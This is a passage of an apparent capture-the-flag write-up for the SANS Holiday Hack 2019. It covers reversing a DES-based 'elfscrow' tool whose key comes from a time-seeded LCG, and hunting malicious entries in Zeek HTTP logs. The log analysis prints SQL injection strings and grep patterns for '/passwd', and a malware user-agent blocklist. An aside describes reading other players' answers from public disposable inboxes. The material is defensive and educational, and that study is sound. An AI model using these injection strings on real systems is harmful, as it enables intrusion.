<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">for</span> i in 0f5f510e 1cc7e121 439f15e6 667d6896 adb798ca ba417715; <span style="color:#ff79c6">do</span> curl -Ok https://studentportal.elfu.org/krampus/<span style="color:#8be9fd;font-style:italic">$i</span>.png &amp; <span style="color:#ff79c6">done</span>
</code></pre></td></tr></table>
</div>
</div><p>Yes, it downloads the files &hellip; We can now open the downloaded images which represents the scraps of papers &hellip;
we retrieve the cutting edge santa&rsquo;s sleigh guiding system :)</p>
<p><strong>Bonus:</strong>
When visiting some throwable email address such as ..@yopmail.com
and opening the inbox, we can find the emails with the answer for the ML challenge from another player 😆</p>
<p>Loooool 🤣🤣🤣 !!! SANS needs to review that on next year challenge &hellip;</p>
<p>Maybe also someI possible GDPR issues for those who disclose their real email address ;)</p>
<h2 id="crypto-challenge">Crypto challenge</h2>
<ul>
<li>file elfscrow.exe</li>
<li>elfscrow.exe: PE32 executable (console) Intel 80386, for MS Windows</li>
<li>DES cryptanalysis</li>
</ul>
<p>First we generate a bunch of file containing &lsquo;A&rsquo; a certain number of times.
As an example A7.txt contains 7*&lsquo;A&rsquo;, when A32.txt contains 32*&lsquo;A&rsquo; &hellip;
it allows us to figure out that the encryption algorithm is DES with 8 bytes keys.</p>
<p>Kudos to <a href="https://www.youtube.com/watch?v=obJdpKDpFBA">Ron Bowes</a> for this excellent introduction tutorial on crypto reverse engineering.</p>
<p>We could alternatively have figure out the algorithm from IDA with this <a href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id">reference</a>
which explains the ALG_ID=6601 passed to <code>mov [ebp+keyBlob.hdr.aiKeyAlg], 6601h</code> is for DES algorithm.</p>
<p>Looking at elfscrow.exe binary in IDA-free,
We find some functions of interest, including super_secure_random(..) function
where we see the below two hexadecimal values:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#bd93f9">0x269EC3</span>
<span style="color:#bd93f9">2531011</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#bd93f9">0x343FD</span>
<span style="color:#bd93f9">214013</span>
</code></pre></td></tr></table>
</div>
</div><p>Googling for those values,
we find that they are commonly used parameters of <a href="https://en.wikipedia.org/wiki/Linear_congruential_generator">LCGs on Microsoft implementation</a>
and we can get its python implementation on <a href="https://rosettacode.org/wiki/Linear_congruential_generator#Python">rosettacode.org</a>.</p>
<p>The below implementation is a PSeudo-Random Number Generator (PRNG) implementation by Microsoft.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">msvcrt_rand</span>(seed):
   <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">rand</span>():
      <span style="color:#ff79c6">nonlocal</span> seed
      seed <span style="color:#ff79c6">=</span> (<span style="color:#bd93f9">214013</span><span style="color:#ff79c6">*</span>seed <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2531011</span>) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x7fffffff</span>
      <span style="color:#ff79c6">return</span> seed <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">16</span>
   <span style="color:#ff79c6">return</span> rand
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s find out about the seed, which is a pointer on dword: <code>seed= dword ptr 8</code>.
The binary being 32 bit, then the seed is 32bits long.
Looking in IDA at the function generate_key, we figure out the seed is generated from a timestamp :</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#50fa7b">call</span>    time
<span style="color:#50fa7b">add</span>     esp, <span style="color:#bd93f9">4</span>
<span style="color:#50fa7b">push</span>    eax             <span style="color:#6272a4">; seed
</span><span style="color:#6272a4"></span>call    super_secure_srand <span style="color:#6272a4">; super_secure_srand(int)
</span></code></pre></td></tr></table>
</div>
</div><p>the time function call <a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/time-time32-time64?view=vs-2019">_time64</a> returns the time as seconds elapsed since midnight, January 1, 1970, or -1 in the case of an error. It means that we can generate the exact same seed or bruteforce it if we know a narrow interval time.</p>
<p>We got the following hints for this objective: <strong>We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC.</strong>
which is only 2hours<em>60</em>60=7,200 seconds.</p>
<p>Bruteforcing the file will take at most 7,200 tries.</p>
<p>The &ldquo;super secure srand&rdquo; doesn&rsquo;t do much, it simply prints out the seed
and put it in the &lsquo;state&rsquo; variable which is used later by super_secure_random function
which is equivalent to the python msvcrt_rand(seed) above</p>
<h2 id="objective-12-filter-out-poisoned-sources-of-weather-data">Objective 12 Filter out poisoned sources of weather data</h2>
<ul>
<li><a href="https://downloads.elfu.org/http.log.gz">zip logs</a></li>
<li><a href="https://srf.elfu.org/">Santa&rsquo;s mapping software</a> but we don&rsquo;t have the username, and we only know the password is a default password</li>
</ul>
<p>After decompression of the log archive, we explore a huge 41MB file containing a unique line which is too resources demanding for my <code>vi</code>.
The file being too big, I cannot either <code>cat</code> on the command line, and because it&rsquo;s all on one row, we cannot <code>head -1</code> either :(
On this unique line, we observe a json array of zeek log entries that we can beautify with <code>jq</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -Ok https://downloads.elfu.org/http.log.gz
gunzip http.log.gz
cat http.log | jq <span style="color:#f1fa8c">&#39;.[]&#39;</span>  &gt; http.json
head -32 http.json
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">  {
    <span style="color:#ff79c6">&#34;ts&#34;</span>: <span style="color:#f1fa8c">&#34;2019-10-05T06:50:42-0800&#34;</span>,
    <span style="color:#ff79c6">&#34;uid&#34;</span>: <span style="color:#f1fa8c">&#34;ClRV8h1vYKWXN1G5ke&#34;</span>,
    <span style="color:#ff79c6">&#34;id.orig_h&#34;</span>: <span style="color:#f1fa8c">&#34;238.27.231.56&#34;</span>,
    <span style="color:#ff79c6">&#34;id.orig_p&#34;</span>: <span style="color:#bd93f9">60677</span>,
    <span style="color:#ff79c6">&#34;id.resp_h&#34;</span>: <span style="color:#f1fa8c">&#34;10.20.3.80&#34;</span>,
    <span style="color:#ff79c6">&#34;id.resp_p&#34;</span>: <span style="color:#bd93f9">80</span>,
    <span style="color:#ff79c6">&#34;trans_depth&#34;</span>: <span style="color:#bd93f9">1</span>,
    <span style="color:#ff79c6">&#34;method&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>,
    <span style="color:#ff79c6">&#34;host&#34;</span>: <span style="color:#f1fa8c">&#34;srf.elfu.org&#34;</span>,
    <span style="color:#ff79c6">&#34;uri&#34;</span>: <span style="color:#f1fa8c">&#34;/14.10/Google/&#34;</span>,
    <span style="color:#ff79c6">&#34;referrer&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;version&#34;</span>: <span style="color:#f1fa8c">&#34;1.0&#34;</span>,
    <span style="color:#ff79c6">&#34;user_agent&#34;</span>: <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b4) Gecko/20091124 Firefox/3.6b4 (.NET CLR 3.5.30729)&#34;</span>,
    <span style="color:#ff79c6">&#34;origin&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;request_body_len&#34;</span>: <span style="color:#bd93f9">0</span>,
    <span style="color:#ff79c6">&#34;response_body_len&#34;</span>: <span style="color:#bd93f9">232</span>,
    <span style="color:#ff79c6">&#34;status_code&#34;</span>: <span style="color:#bd93f9">404</span>,
    <span style="color:#ff79c6">&#34;status_msg&#34;</span>: <span style="color:#f1fa8c">&#34;Not Found&#34;</span>,
    <span style="color:#ff79c6">&#34;info_code&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;info_msg&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;tags&#34;</span>: <span style="color:#f1fa8c">&#34;(empty)&#34;</span>,
    <span style="color:#ff79c6">&#34;username&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;password&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;proxied&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;orig_fuids&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;orig_filenames&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;orig_mime_types&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;resp_fuids&#34;</span>: <span style="color:#f1fa8c">&#34;FUPWLQXTNsTNvf33&#34;</span>,
    <span style="color:#ff79c6">&#34;resp_filenames&#34;</span>: <span style="color:#f1fa8c">&#34;-&#34;</span>,
    <span style="color:#ff79c6">&#34;resp_mime_types&#34;</span>: <span style="color:#f1fa8c">&#34;text/html&#34;</span>
  },
</code></pre></td></tr></table>
</div>
</div><p>Now it&rsquo;s gonna be much easier to manipulate :) so let&rsquo;s count the number of logs</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json | jq <span style="color:#f1fa8c">&#39;.uid&#39;</span> | wc -l
<span style="color:#bd93f9">55121</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># investigate .username field</span>
cat http.json | awk <span style="color:#f1fa8c">&#39;{print(tolower($0))}&#39;</span> | jq -c <span style="color:#f1fa8c">&#39;select (.username != &#34;-&#34;) | .username &#39;</span> | sort | uniq -c | sort -rn | tail -50
      <span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
      <span style="color:#bd93f9">4</span> <span style="color:#f1fa8c">&#34;&#39; or &#39;1=1&#34;</span>
      <span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;-r nessus&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>Few rows looks suscpicious and deserves further investigations.
We execute the above commands for every single field by replacing username with other field names,
and we can find some fields of intrests such as <code>user_agent, uri, username, host</code>.</p>
<p>for example, the host <code>ssrf.elfu.org</code> is obviously malicious as it does not exist</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json | awk <span style="color:#f1fa8c">&#39;{print(tolower($0))}&#39;</span> | jq -c <span style="color:#f1fa8c">&#39;select (.username | contains(&#34;&#39;&#39;1=1&#34;)) &#39;</span> &gt;&gt; http.json.malicious
cat http.json | awk <span style="color:#f1fa8c">&#39;{print(tolower($0))}&#39;</span> | jq -c <span style="color:#f1fa8c">&#39;select (.username | contains(&#34;-r nessus&#34;)) &#39;</span> &gt;&gt; http.json.malicious
cat http.json | jq -c <span style="color:#f1fa8c">&#39; &#39;</span> | grep <span style="color:#f1fa8c">&#34;ssrf.elfu&#34;</span> | jq <span style="color:#f1fa8c">&#39; &#39;</span> &gt;&gt; http.json.malicious
</code></pre></td></tr></table>
</div>
</div><p>Exploration of possible SQL Injection, File Injection, XSS, and shell stuffs
The following bring into light above 60 IP adresses that we can store in a json file with the following command:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json | awk <span style="color:#f1fa8c">&#39;{print(tolower($0))}&#39;</span> | jq -c <span style="color:#f1fa8c">&#39; &#39;</span> | egrep <span style="color:#f1fa8c">&#34;union|&lt;|/passwd|/bash/ruby/perl/python&#34;</span> &gt;&gt; http.json.malicious
</code></pre></td></tr></table>
</div>
</div><p>Looking at suspicious user_agent,
we find this <a href="https://github.com/Neo23x0/sigma/blob/master/rules/proxy/proxy_ua_malware.yml">resource</a>
which detects suspicious user agent strings used by malware in proxy logs.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json | awk <span style="color:#f1fa8c">&#39;{print(tolower($0))}&#39;</span> | jq -c <span style="color:#f1fa8c">&#39;.user_agent &#39;</span> | egrep <span style="color:#f1fa8c">&#34;zeroup| adlib|tiny|bgroom|changhuatong|choltbagent|mozilla/5.0 wininet|rookie/1.0|backdoorbot|charon|inferno| pxyscand| asd| mdms|sample|nocase|moxilla|win32 |agent |autoit|iczeliondownload|httpbrowser/1.0|&lt;\|&gt;|nsis_inetc|wget/1.9\+cvs-stable \(red hat modified\)&#34;</span> | sort | uniq -c | sort -rn
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;wget/1.9+cvs-stable (red hat modified)&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;rookie/1.0&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;mozilla/5.0 wininet&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;httpbrowser/1.0&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;choltbagent&#34;</span>

cat http.json | jq -c <span style="color:#f1fa8c">&#39; [&#34;wget/1.9+cvs-stable (red hat modified)&#34;, &#34;rookie/1.0&#34;, &#34;mozilla/5.0 wininet&#34;, &#34;httpbrowser/1.0&#34;, &#34;choltbagent&#34;] as $blacklist | select ( .[&#34;id.orig_h&#34;] as $in | $blacklist | index($in) ) &#39;</span> &gt;&gt; http.json.malicious
</code></pre></td></tr></table>
</div>
</div><p>From the http.json.malicious file, we can try to pivot on the user_agent.
I have extracted all user_agent and then escaped some special characters:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
